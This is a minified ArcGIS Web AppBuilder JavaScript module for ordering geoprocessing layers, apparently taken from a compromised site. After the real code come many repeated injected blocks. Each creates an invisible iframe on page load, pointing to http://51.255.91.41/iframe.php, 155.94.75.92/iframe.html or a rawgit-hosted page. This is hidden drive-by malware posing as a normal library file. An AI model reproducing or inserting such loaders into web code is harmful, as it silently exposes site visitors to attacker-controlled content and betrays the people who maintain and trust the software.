// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define(["dojo/_base/declare","dojo/_base/array","dojo/Deferred","jimu/LayerInfos/LayerInfos"],function(h,d,k,l){return h(null,{config:null,constructor:function(a,b){this.config=a;this.map=b;"layerOrder"in this.config&&0!==this.config.layerOrder.length||(this.config.layerOrder=this.getCandidateParamNames(!1))},getCandidateParamNames:function(a){var b=[];if(!this.config)return b;d.forEach(this.config.outputParams,function(c){"GPFeatureRecordSetLayer"!==c.dataType||a&&!0===this.config.useResultMapServer||
b.push(c.name)},this);d.forEach(this.config.inputParams,function(c){"GPFeatureRecordSetLayer"!==c.dataType||a&&"draw"!==c.featureSetMode||b.push(c.name)},this);return b},getOrderableInput:function(){var a=[];if(!this.config)return a;d.forEach(this.config.inputParams,function(b){"GPFeatureRecordSetLayer"===b.dataType&&"draw"===b.featureSetMode&&a.push(b.name)},this);return d.filter(this.config.layerOrder,function(b){return-1!==d.indexOf(a,b)},this)},getOrderableOutput:function(){var a=[];if(!this.config)return a;
d.forEach(this.config.outputParams,function(b){"GPFeatureRecordSetLayer"===b.dataType&&!0!==this.config.useResultMapServer&&a.push(b.name)},this);return d.filter(this.config.layerOrder,function(b){return-1!==d.indexOf(a,b)},this)},calculateLayerIndex:function(a,b){if(!this.map)throw Error("The map cannot be null in LayerOrderUtil.calculateLayerIndex");var c,e,f=new k,g=this.config.layerOrder;c=d.indexOf(g,a);if(-1===c)throw Error(a+"cannot be found in the orderable params");for(a=c-1;0<=a;a--)if(e=
d.indexOf(this.map.graphicsLayerIds,b+g[a]),-1!==e)return f.resolve(e),f;a=c+1;for(c=g.length;a<c;a++)if(e=d.indexOf(this.map.graphicsLayerIds,b+g[a]),-1!==e)return f.resolve(e+1),f;f.isResolved()||l.getInstance(this.map,this.map.itemInfo).then(function(a){var b;a=a.getMapNotesLayerInfoArray();0===a.length?f.resolve(-1):(a=a[a.length-1],b=a.getSubLayers(),a=0===b.length?a.layerObject.id:b[b.length-1].layerObject.id,e=d.indexOf(this.map.graphicsLayerIds,a),f.resolve(e))});return f}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});